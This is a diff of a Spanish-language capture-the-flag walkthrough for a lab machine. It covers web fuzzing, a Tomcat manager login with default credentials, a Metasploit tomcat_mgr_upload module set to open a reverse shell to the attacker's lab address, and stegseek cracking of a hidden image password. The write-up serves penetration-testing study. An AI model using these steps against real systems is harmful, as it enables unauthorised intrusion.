@@ -19,12 +19,12 @@
 - [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades)
   - [Tomcat](#)
 - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades)
-  - [Metasploit](#)
+  - [Reverse Shell](#)
 - [Post-explotación](#post-explotación)
   - [Movimiento Lateral I](#)
   - [Movimiento Lateral II](#)
        - [linPEAS](#)
-       - [Reverse Shell]()
+       - [Reverse Shell](#)
   - [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades-1)
        - [SUDO -L](#)
   - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades-1)
@@ -54,7 +54,9 @@ Para fuzzear la web usaremos este comando con una wordlist que tengamos:
 
 Para ver solo archivos con extensión .txt,.php,.html
 
-```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.221.9/FUZZ -e .txt,.html,.php -ic```
+```
+ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.221.9/FUZZ -e .txt,.html,.php -ic
+```
 
 Con este comando podemos recolectar información de un servidor web:
 ```whatweb http://192.168.221.9```
@@ -72,3 +74,48 @@ Conseguimos conectarnos con las credenciales por defecto:
 User: tomcat
 Password: tomcat
 ```
+## Explotación de vulnerabilidades
+
+### Reverse Shell
+
+Para obtener un reverse shell buscaremos en el metasploit la version del tomcat que podemos verlo en la página web del tomcat.
+
+Dentro del metasploit escribiremos esto:
+```
+use multi/http/tomcat_mgr_upload
+set lhost 192.168.221.4
+set rport 8080
+set HttpPassword tomcat
+set HttpUsername tomcat
+set rhosts 192.168.221.9
+exploit
+```
+Con esto obtendremos control del usuario **www-data**
+
+## Post-explotación
+
+## Movimiento Lateral I
+
+Después de algo de enumeración encontramos en la carpeta **/var** una que se llama **backups/hacksudo**
+
+Dentro tenemos unos archivos:
+```log.txt```, ```hacksudo.zip``` y ```vishal.jpg```
+
+En el archivo **log.txt** aparece esto:
+```
+ilovestegno
+```
+
+> Lo tomaremos como una pista para saber que hay un proceso de **esteganografía**
+
+En el archivo **hacksudo.zip** no tenemos nada importante
+
+Lo que haremos con este archivo **vishal.jpg**, és extraer los datos ocultos con la herramienta [Stegseek](https://github.com/RickdeJager/stegseek)
+
+Usaremos este comando con docker:
+
+```sudo docker run --rm -it -v "$(pwd):/steg" rickdejager/stegseek vishal.jpg rockyou.txt```
+
+> ⚠️ IMPORTANTE: Tener tanto el archivo vishal.jpg como el wordlist que usaremos en la misma carpeta
+
+<img src="https://i.gyazo.com/e509cd614352dd3dacfa16f7349f2ef4.png">
